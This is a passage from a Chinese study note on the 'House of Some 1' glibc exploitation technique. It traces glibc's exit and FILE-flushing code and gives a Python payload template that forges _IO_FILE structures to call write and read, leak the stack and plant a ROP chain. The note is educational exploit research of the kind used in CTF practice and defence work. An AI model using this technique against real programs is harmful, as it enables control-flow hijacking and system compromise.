<p>之所以说方便，是因为 @CSOME 直接提供了<a target="_blank" rel="noopener" href="https://github.com/CsomePro/Some-of-House">自动化脚本</a>（实际上自己手动打一点也不方便…）</p>
<p>我要做的只需要往一个地方写上他提供的<code>payload</code>，然后往<code>_IO_list_all</code>写上<code>payload</code>的地址即可</p>
<p>具体可见下面<code>自动化House of Some 1的Exp</code></p>
<h1 id="House-of-Some-1">House of Some 1<a class="anchor" href="#House-of-Some-1">·</a></h1>
<p>依赖自动化可不是个好习惯，既然是学习笔记那就应该要学一下其中的原理</p>
<p>理论上这条链是在<code>House of Apple 2</code>上发展而来的（虽然后面并没用到），我这属于越级打怪了…</p>
<p>但是有了前面几篇笔记的知识其实也能看懂</p>
<p>这里可以先去看看<code>House of Some 1</code>的原文：<a target="_blank" rel="noopener" href="https://blog.csome.cc/p/house-of-some/">Bring back the stack attack – House of some一种高版本glibc的利用思路</a></p>
<h2 id="exit链">exit链<a class="anchor" href="#exit链">·</a></h2>
<p>先复习一下之前在<a href="https://tover.xyz/p/PWN-Note-3-Tcache-in-Libc-2-34-and-IO-File/#exit%E7%9A%84%E6%94%BB%E5%87%BB%E9%93%BE%EF%BC%88NG%EF%BC%89">笔记vol.3</a>中提到的<code>exit</code>攻击链，有</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">exit</span> (<span class="keyword">int</span> status)</span><br><span class="line">&gt; __run_exit_handlers (status, &amp;__exit_funcs, <span class="literal">true</span>, <span class="literal">true</span>)</span><br><span class="line">==&gt; _IO_cleanup (<span class="keyword">void</span>)</span><br><span class="line">====&gt; _IO_flush_all_lockp (<span class="number">0</span>)       <span class="comment">// for fp in _IO_list_all:</span></span><br><span class="line">======&gt; _IO_OVERFLOW (fp, EOF)</span><br></pre></td></tr></table></figure>
<p>重点关注里面的<code>_IO_flush_all_lockp</code>函数，在<code>libio/genops.c:685</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span></span><br><span class="line">_IO_flush_all_lockp (<span class="keyword">int</span> do_lock)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">int</span> result = <span class="number">0</span>;</span><br><span class="line">  FILE *fp;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class="line">  _IO_cleanup_region_start_noarg (flush_cleanup);</span><br><span class="line">  _IO_lock_lock (list_all_lock);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (fp = (FILE *) _IO_list_all; fp != <span class="literal">NULL</span>; fp = fp-&gt;_chain)</span><br><span class="line">    &#123;</span><br><span class="line">      run_fp = fp;</span><br><span class="line">      <span class="keyword">if</span> (do_lock)</span><br><span class="line">	_IO_flockfile (fp);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (((fp-&gt;_mode &lt;= <span class="number">0</span> &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)</span><br><span class="line">	   || (_IO_vtable_offset (fp) == <span class="number">0</span></span><br><span class="line">	       &amp;&amp; fp-&gt;_mode &gt; <span class="number">0</span> &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr</span><br><span class="line">				    &gt; fp-&gt;_wide_data-&gt;_IO_write_base))</span><br><span class="line">	   )</span><br><span class="line">	  &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)		<span class="comment">// &lt;=</span></span><br><span class="line">	result = EOF;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (do_lock)</span><br><span class="line">	_IO_funlockfile (fp);</span><br><span class="line">      run_fp = <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class="line">  _IO_lock_unlock (list_all_lock);</span><br><span class="line">  _IO_cleanup_region_end (<span class="number">0</span>);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在<code>_IO_flush_all_lockp</code>中，对于以<code>_IO_list_all</code>为链头的链表的每个<code>fp</code>，会执行<code>_IO_OVERFLOW (fp, EOF)</code></p>
<p>再看一下原生的<code>_IO_list_all</code>链上面有什么，根据<code>libio/stdfiles.c</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># <span class="meta-keyword">define</span> DEF_STDFILE(NAME, FD, CHAIN, FLAGS) \</span></span><br><span class="line"><span class="meta">... ...</span></span><br><span class="line"></span><br><span class="line">DEF_STDFILE(_IO_2_1_stdin_, <span class="number">0</span>, <span class="number">0</span>, _IO_NO_WRITES);</span><br><span class="line">DEF_STDFILE(_IO_2_1_stdout_, <span class="number">1</span>, &amp;_IO_2_1_stdin_, _IO_NO_READS);</span><br><span class="line">DEF_STDFILE(_IO_2_1_stderr_, <span class="number">2</span>, &amp;_IO_2_1_stdout_, _IO_NO_READS+_IO_UNBUFFERED);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_plus</span> *_<span class="title">IO_list_all</span> =</span> &amp;_IO_2_1_stderr_;</span><br><span class="line">libc_hidden_data_def (_IO_list_all)</span><br></pre></td></tr></table></figure>
<p>就是</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_IO_list_all -&gt; _IO_2_1_stderr_ -&gt; _IO_2_1_stdout_ -&gt; _IO_2_1_stdin_ -&gt; <span class="literal">NULL</span></span><br></pre></td></tr></table></figure>
<p>所以如果我伪造一个<code>struct _IO_FILE_plus</code>结构（假设叫<code>fake_file</code>吧），然后修改<code>_IO_list_all</code>指向<code>fake_file</code>，或者修改<code>stderr</code>、<code>stdout</code>、<code>stdin</code>的<code>file</code>的<code>_chain</code>指针，让其指向<code>fake_file</code>，那么就可以执行<code>fake_file</code>的<code>_IO_OVERFLOW</code>函数</p>
<p>具体执行什么可以通过<code>fake_file</code>的<code>vtable</code>控制</p>
<h2 id="多次执行（自持）">多次执行（自持）<a class="anchor" href="#多次执行（自持）">·</a></h2>
<p>然后问题就到了<code>_IO_OVERFLOW</code>该指向什么函数</p>
<p>首先执行一次是不够的，所以要考虑如何实现多次的函数执行</p>
<p>和<code>House of Some 2</code>的递归调用不同的是，这里的<code>_IO_flush_all_lockp</code>会遍历<code>_IO_list_all</code>链上的每个<code>fp</code>，并执行<code>_IO_OVERFLOW (fp, EOF)</code></p>
<p>那么只要在伪造的<code>fp</code>上让<code>_chain</code>指针指向下一个伪造的<code>fp</code>，然后让下一个<code>fp</code>的<code>_chain</code>指向下下个<code>fp</code>，如此反复，就可以执行多个函数</p>
<p>于是问题就变成了该执行什么函数</p>
<p>这里就直接上帝视角，根据 @CSOME 的思路，可以把控制流劫持到栈上，那么需要做的大概有三件事情</p>
<ol>
<li>泄露栈地址</li>
<li>把<code>rop</code>写到栈上</li>
<li>把控制流劫持到<code>rop</code></li>
</ol>
<p>另外还有两件隐藏的事情</p>
<p>一个是上面的2需要1有输出后才能执行，所以1执行结束后还要通过<code>read</code>或类似的函数把新的<code>fp</code>写到<code>_IO_list_all</code>链上，以维持2的函数执行</p>
<p>另一个是，本地和远程的栈结构可能会不一样，于是就需要泄露栈上的数据，然后找到返回地址在栈上的地址</p>
<p>那么就是加上</p>
<ol start="4">
<li>执行<code>read</code>写入伪造的<code>fp</code>，维持<code>_IO_list_all</code>链上的控制流</li>
<li>泄露<code>ret</code>附近的数据，找到写<code>rop</code>的地址</li>
</ol>
<p>整理一下这几件事的顺序，大概要伪造<code>6</code>个<code>fp</code>：</p>
<ol>
<li>
<p><code>fp0</code>是<code>_IO_list_all</code>链头指向的第一个<code>fp</code>，主要负责在限制长度的情况下通过<code>read</code>实现更多字节的输入，也就是写入下面的<code>fp1</code>和<code>fp2</code></p>
<p>PS：其实这题的<code>0x200</code>字节好像是够的，那么就直接从<code>fp1</code>开始也可以</p>
</li>
<li>
<p><code>fp1</code>负责通过<code>write</code>泄露栈地址，可以通过<code>environ</code>泄露</p>
</li>
<li>
<p><code>fp2</code>负责在知道栈地址后通过<code>read</code>写入<code>fp3</code>和<code>fp4</code>，维持<code>_IO_list_all</code>链上的控制流</p>
</li>
<li>
<p><code>fp3</code>负责泄露栈上的数据，找到写<code>rop</code>的地址</p>
</li>
<li>
<p><code>fp4</code>负责通过<code>read</code>写入<code>fp5</code></p>
</li>
<li>
<p><code>fp5</code>负责写入<code>rop</code>，并且设置<code>_chain</code>为<code>0</code>，让函数返回</p>
</li>
</ol>
<h2 id="write和read">write和read<a class="anchor" href="#write和read">·</a></h2>
<p>总结一下，上面的几个操作都只要调用<code>write</code>和<code>read</code>就好了</p>
<p>那么看看要怎么调</p>
<h3 id="如何调用write">如何调用write<a class="anchor" href="#如何调用write">·</a></h3>
<p>先来说简单的，<code>write</code>可以直接调用<code>_IO_file_overflow</code>，在<code>libio/fileops.c:730</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span></span><br><span class="line">_IO_new_file_overflow (FILE *f, <span class="keyword">int</span> ch)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (f-&gt;_flags &amp; _IO_NO_WRITES) <span class="comment">/* SET ERROR */</span></span><br><span class="line">    &#123;</span><br><span class="line">      f-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line">      __set_errno (EBADF);</span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="comment">/* If currently reading or no buffer allocated. */</span></span><br><span class="line">  <span class="keyword">if</span> ((f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING) == <span class="number">0</span> || f-&gt;_IO_write_base == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* Allocate a buffer if needed. */</span></span><br><span class="line">      <span class="keyword">if</span> (f-&gt;_IO_write_base == <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">	  _IO_doallocbuf (f);</span><br><span class="line">	  _IO_setg (f, f-&gt;_IO_buf_base, f-&gt;_IO_buf_base, f-&gt;_IO_buf_base);</span><br><span class="line">	&#125;</span><br><span class="line">      <span class="comment">/* Otherwise must be currently reading.</span></span><br><span class="line"><span class="comment">	 If _IO_read_ptr (and hence also _IO_read_end) is at the buffer end,</span></span><br><span class="line"><span class="comment">	 logically slide the buffer forwards one block (by setting the</span></span><br><span class="line"><span class="comment">	 read pointers to all point at the beginning of the block).  This</span></span><br><span class="line"><span class="comment">	 makes room for subsequent output.</span></span><br><span class="line"><span class="comment">	 Otherwise, set the read pointers to _IO_read_end (leaving that</span></span><br><span class="line"><span class="comment">	 alone, so it can continue to correspond to the external position). */</span></span><br><span class="line">      <span class="keyword">if</span> (__glibc_unlikely (_IO_in_backup (f)))</span><br><span class="line">	&#123;</span><br><span class="line">	  <span class="keyword">size_t</span> nbackup = f-&gt;_IO_read_end - f-&gt;_IO_read_ptr;</span><br><span class="line">	  _IO_free_backup_area (f);</span><br><span class="line">	  f-&gt;_IO_read_base -= MIN (nbackup,</span><br><span class="line">				   f-&gt;_IO_read_base - f-&gt;_IO_buf_base);</span><br><span class="line">	  f-&gt;_IO_read_ptr = f-&gt;_IO_read_base;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (f-&gt;_IO_read_ptr == f-&gt;_IO_buf_end)</span><br><span class="line">	f-&gt;_IO_read_end = f-&gt;_IO_read_ptr = f-&gt;_IO_buf_base;</span><br><span class="line">      f-&gt;_IO_write_ptr = f-&gt;_IO_read_ptr;</span><br><span class="line">      f-&gt;_IO_write_base = f-&gt;_IO_write_ptr;</span><br><span class="line">      f-&gt;_IO_write_end = f-&gt;_IO_buf_end;</span><br><span class="line">      f-&gt;_IO_read_base = f-&gt;_IO_read_ptr = f-&gt;_IO_read_end;</span><br><span class="line"></span><br><span class="line">      f-&gt;_flags |= _IO_CURRENTLY_PUTTING;</span><br><span class="line">      <span class="keyword">if</span> (f-&gt;_mode &lt;= <span class="number">0</span> &amp;&amp; f-&gt;_flags &amp; (_IO_LINE_BUF | _IO_UNBUFFERED))</span><br><span class="line">	f-&gt;_IO_write_end = f-&gt;_IO_write_ptr;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">if</span> (ch == EOF)</span><br><span class="line">    <span class="keyword">return</span> _IO_do_write (f, f-&gt;_IO_write_base,		<span class="comment">// &lt;=</span></span><br><span class="line">			 f-&gt;_IO_write_ptr - f-&gt;_IO_write_base);</span><br><span class="line">  <span class="keyword">if</span> (f-&gt;_IO_write_ptr == f-&gt;_IO_buf_end ) <span class="comment">/* Buffer is really full */</span></span><br><span class="line">    <span class="keyword">if</span> (_IO_do_flush (f) == EOF)</span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">  *f-&gt;_IO_write_ptr++ = ch;</span><br><span class="line">  <span class="keyword">if</span> ((f-&gt;_flags &amp; _IO_UNBUFFERED)</span><br><span class="line">      || ((f-&gt;_flags &amp; _IO_LINE_BUF) &amp;&amp; ch == <span class="string">&#x27;\n&#x27;</span>))</span><br><span class="line">    <span class="keyword">if</span> (_IO_do_write (f, f-&gt;_IO_write_base,</span><br><span class="line">		      f-&gt;_IO_write_ptr - f-&gt;_IO_write_base) == EOF)</span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">  <span class="keyword">return</span> (<span class="keyword">unsigned</span> <span class="keyword">char</span>) ch;</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_ver (_IO_new_file_overflow, _IO_file_overflow)</span><br></pre></td></tr></table></figure>
<p>在<code>_IO_flush_all_lockp</code>中调用的是<code>_IO_OVERFLOW (fp, EOF)</code>，所以如果让<code>_IO_OVERFLOW</code>指向<code>_IO_new_file_overflow</code>的话，就可以触发其中的</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (ch == EOF)</span><br><span class="line">  <span class="keyword">return</span> _IO_do_write (f, f-&gt;_IO_write_base,</span><br><span class="line">	 f-&gt;_IO_write_ptr - f-&gt;_IO_write_base);</span><br></pre></td></tr></table></figure>
<p>其中<code>_IO_do_write</code>也在<code>libio/fileops.c</code>中</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span></span><br><span class="line">_IO_new_do_write (FILE *fp, <span class="keyword">const</span> <span class="keyword">char</span> *data, <span class="keyword">size_t</span> to_do)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> (to_do == <span class="number">0</span></span><br><span class="line">	  || (<span class="keyword">size_t</span>) new_do_write (fp, data, to_do) == to_do) ? <span class="number">0</span> : EOF;</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_ver (_IO_new_do_write, _IO_do_write)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">size_t</span></span></span><br><span class="line"><span class="function"><span class="title">new_do_write</span> <span class="params">(FILE *fp, <span class="keyword">const</span> <span class="keyword">char</span> *data, <span class="keyword">size_t</span> to_do)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">size_t</span> count;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_IS_APPENDING)</span><br><span class="line">    <span class="comment">/* On a system without a proper O_APPEND implementation,</span></span><br><span class="line"><span class="comment">       you would need to sys_seek(0, SEEK_END) here, but is</span></span><br><span class="line"><span class="comment">       not needed nor desirable for Unix- or Posix-like systems.</span></span><br><span class="line"><span class="comment">       Instead, just indicate that offset (before and after) is</span></span><br><span class="line"><span class="comment">       unpredictable. */</span></span><br><span class="line">    fp-&gt;_offset = _IO_pos_BAD;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (fp-&gt;_IO_read_end != fp-&gt;_IO_write_base)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">off64_t</span> new_pos</span><br><span class="line">	= _IO_SYSSEEK (fp, fp-&gt;_IO_write_base - fp-&gt;_IO_read_end, <span class="number">1</span>);</span><br><span class="line">      <span class="keyword">if</span> (new_pos == _IO_pos_BAD)</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">      fp-&gt;_offset = new_pos;</span><br><span class="line">    &#125;</span><br><span class="line">  count = _IO_SYSWRITE (fp, data, to_do);	<span class="comment">// &lt;=</span></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_cur_column &amp;&amp; count)</span><br><span class="line">    fp-&gt;_cur_column = _IO_adjust_column (fp-&gt;_cur_column - <span class="number">1</span>, data, count) + <span class="number">1</span>;</span><br><span class="line">  _IO_setg (fp, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base);</span><br><span class="line">  fp-&gt;_IO_write_base = fp-&gt;_IO_write_ptr = fp-&gt;_IO_buf_base;</span><br><span class="line">  fp-&gt;_IO_write_end = (fp-&gt;_mode &lt;= <span class="number">0</span></span><br><span class="line">		       &amp;&amp; (fp-&gt;_flags &amp; (_IO_LINE_BUF | _IO_UNBUFFERED))</span><br><span class="line">		       ? fp-&gt;_IO_buf_base : fp-&gt;_IO_buf_end);</span><br><span class="line">  <span class="keyword">return</span> count;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>拼起来，也就是可以执行</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">write(fp-&gt;_fileno, fp-&gt;_IO_write_base, fp-&gt;_IO_write_ptr - fp-&gt;_IO_write_base)</span><br></pre></td></tr></table></figure>
<p>另外，注意在<code>_IO_new_file_overflow</code>中还有下面那一堆</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">  <span class="comment">/* If currently reading or no buffer allocated. */</span></span><br><span class="line">  <span class="keyword">if</span> ((f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING) == <span class="number">0</span> || f-&gt;_IO_write_base == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">... ...</span><br><span class="line">      <span class="keyword">if</span> (f-&gt;_IO_read_ptr == f-&gt;_IO_buf_end)</span><br><span class="line">	f-&gt;_IO_read_end = f-&gt;_IO_read_ptr = f-&gt;_IO_buf_base;</span><br><span class="line">      f-&gt;_IO_write_ptr = f-&gt;_IO_read_ptr;</span><br><span class="line">      f-&gt;_IO_write_base = f-&gt;_IO_write_ptr;</span><br><span class="line">      f-&gt;_IO_write_end = f-&gt;_IO_buf_end;</span><br><span class="line">      f-&gt;_IO_read_base = f-&gt;_IO_read_ptr = f-&gt;_IO_read_end;</span><br><span class="line"></span><br><span class="line">      f-&gt;_flags |= _IO_CURRENTLY_PUTTING;</span><br><span class="line">      <span class="keyword">if</span> (f-&gt;_mode &lt;= <span class="number">0</span> &amp;&amp; f-&gt;_flags &amp; (_IO_LINE_BUF | _IO_UNBUFFERED))</span><br><span class="line">	f-&gt;_IO_write_end = f-&gt;_IO_write_ptr;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>为了避免它修改我设置好的<code>_IO_write_base</code>和<code>_IO_write_ptr</code>，最好给<code>_flags</code>设置上<code>_IO_CURRENTLY_PUTTING</code>，避免进入这个<code>if</code>语句</p>
<h4 id="payload">payload<a class="anchor" href="#payload">·</a></h4>
<p>给一个参考的<code>payload</code>模板</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write_template</span>(<span class="params">buf, nbytes, next_fp</span>):</span></span><br><span class="line">    <span class="comment"># write(fp-&gt;_fileno, fp-&gt;_IO_write_base, fp-&gt;_IO_write_ptr - fp-&gt;_IO_write_base)</span></span><br><span class="line">    payload = flat(&#123;</span><br><span class="line">        <span class="number">0x00</span>: <span class="number">0x800</span>,                                    <span class="comment"># _flags         =&gt; _IO_CURRENTLY_PUTTING</span></span><br><span class="line">                                                        <span class="comment">#                   in _IO_new_file_overflow,</span></span><br><span class="line">                                                        <span class="comment">#                   bypass (f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING) == 0</span></span><br><span class="line">        <span class="number">0x10</span>: buf,                                      <span class="comment"># _IO_read_end   =&gt; in new_do_write,</span></span><br><span class="line">                                                        <span class="comment">#                   bypass fp-&gt;_IO_read_end != fp-&gt;_IO_write_base</span></span><br><span class="line">        <span class="number">0x20</span>: buf,                                      <span class="comment"># _IO_write_base =&gt; read buf</span></span><br><span class="line">        <span class="number">0x28</span>: buf + nbytes,                             <span class="comment"># _IO_write_ptr  =&gt; read nbytes</span></span><br><span class="line">                                                        <span class="comment">#                   in _IO_flush_all_lockp,</span></span><br><span class="line">                                                        <span class="comment">#                   fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base</span></span><br><span class="line">        <span class="number">0x68</span>: next_fp,                                  <span class="comment"># _chain</span></span><br><span class="line">        <span class="number">0x70</span>: <span class="number">1</span>,                                        <span class="comment"># _fileno        =&gt; read fd, stdin</span></span><br><span class="line">        <span class="number">0xc0</span>: <span class="number">0</span>,                                        <span class="comment"># _mode          =&gt; in _IO_flush_all_lockp,</span></span><br><span class="line">                                                        <span class="comment">#                   fp-&gt;_mode &lt;= 0</span></span><br><span class="line">        <span class="number">0xd8</span>: libc_IO_file_jumps,                       <span class="comment"># vtable         =&gt; _IO_OVERFLOW -&gt; _IO_new_file_overflow</span></span><br><span class="line">    &#125;, filler=<span class="string">b&quot;\x00&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> payload</span><br></pre></td></tr></table></figure>
<h3 id="如何调用read">如何调用read<a class="anchor" href="#如何调用read">·</a></h3>
<p><code>read</code>的调用会稍微复杂一点</p>
<h4 id="IO-new-file-underflow（NG）">_IO_new_file_underflow（NG）<a class="anchor" href="#IO-new-file-underflow（NG）">·</a></h4>
<p>首先看一个失败的例子</p>
<p>在<a href="https://tover.xyz/p/PWN-Note-4-House-of-Some-2/#Part-2-%E5%88%A9%E7%94%A8-IO-SYSREAD%E5%AE%9E%E7%8E%B0%E5%BE%AA%E7%8E%AF%E8%B0%83%E7%94%A8">笔记vol.4</a>中有说过，在<code>_IO_new_file_underflow</code>里面有一个<code>_IO_SYSREAD</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span></span><br><span class="line">_IO_new_file_underflow (FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">ssize_t</span> count;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* C99 requires EOF to be &quot;sticky&quot;.  */</span></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_EOF_SEEN)</span><br><span class="line">    <span class="keyword">return</span> EOF;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_NO_READS)</span><br><span class="line">    &#123;</span><br><span class="line">      fp-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line">      __set_errno (EBADF);</span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_read_ptr &lt; fp-&gt;_IO_read_end)</span><br><span class="line">    <span class="keyword">return</span> *(<span class="keyword">unsigned</span> <span class="keyword">char</span> *) fp-&gt;_IO_read_ptr;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> 